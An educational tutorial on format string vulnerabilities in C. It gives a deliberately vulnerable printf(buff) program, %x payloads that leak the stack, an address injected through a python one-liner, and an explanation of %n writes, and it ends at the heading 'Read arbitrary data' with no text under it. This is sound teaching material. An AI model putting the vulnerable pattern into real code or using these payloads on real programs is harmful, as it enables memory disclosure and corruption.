# Format string vulnerability

A format string vulnerability is a vulnerability about using vulnerable functions of the printf family, which don't check the format string itself. With a proper format specifier, you can view arbitrary data within the program, overwrite it and even control the flow of the program.

## View vulnerability

Consider this program:
```C
#include <stdio.h>
#include <string.h>

// gcc format-string.c -o format-string -m32

int main(int argc, char *argv[]){
  char buff[200];
  strncpy(buff, argv[1], 200);
  printf(buff);
  return 0;
}
```

Input usual string:
```bash
$ ./format-string "My String"
My String
```

Input string with format specifier `x`, which will show you hex:
```bash
$ ./format-string AAAA%x
AAAAfff932ef
```

You'll get some strange input...

Try another one:
```bash
$ ./format-string AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAffd972d4.c8.5665522b.0.0.0.ffd96424.0.41414141.252e7825
```

In this case, you got another artifact. Dots here is to simplify the view.

So, the artifact 41414141 is our string that we input at the beginning of the string. And this all is a stack. The program itself gives us the content of the stack.

```bash
$ ./format-string AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x.%x
AAAAffe442cb.c8.565d922b.0.0.0.ffe43aa4.0.41414141.252e7825.78252e78.2e78252e.252e7825
```

The next stuff is a continuation of our string.

### What can we do with it?

We can specify at the beginning of our string some address.

```bash
$ ./format-string $(python -c 'print "\xef\xbe\xad\xde" + "%x." * 100')
ﾭ�ffbb11c5.c8.565ad22b.0.0.0.ffbb0d04.0.deadbeef.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.78252e78.2e78252e.252e7825.5d688c00.ffbb0c70.0.0.f7dcdee5.f7f9a000.f7f9a000.
```

You see the value `0xdeadbeef` in the output. With different specifiers, we can write to this address or read what in this address.

## Format string specifiers

1. %d - decimal(int) - value.
2. %u - unsigned decimal(unsigned int) - value.
3. %x - hexadecimal(unsigned int) - value.
4. %s - string((const) unsigned char *) - reference.
5. %n - number of bytes written so far(* int) - reference.
6. %p - show what the pointer contains - value.

### Try different specifiers

```C
#include <stdio.h>

// gcc specifiers.c -o specifiers -m32

int main(int argc, char *argv[]){
  int num = -824;
  printf("Signed int: %d\n", num);
  unsigned int num2 = 10000;
  printf("Unsigned int: %u\n", num2);
  printf("Hexadecimal: %x\n", num);
  int *p = &num2;
  printf("Pointer: %p\n", p);
  const char *s = "Some string";
  printf("String: %s\n", s);
  int *count = &num2;
  printf("Number of bytes written: %n\n", count);
  printf("%u\n", *count);
  return 0;
}
```

On the last one, it will write the number of bytes written at the address within count pointer or num2, so, then I wrote this value and it's 25 bytes, which you can determine in python interpreter:
```bash
>>> len('Number of bytes written: ')
25
```

## Read arbitrary data
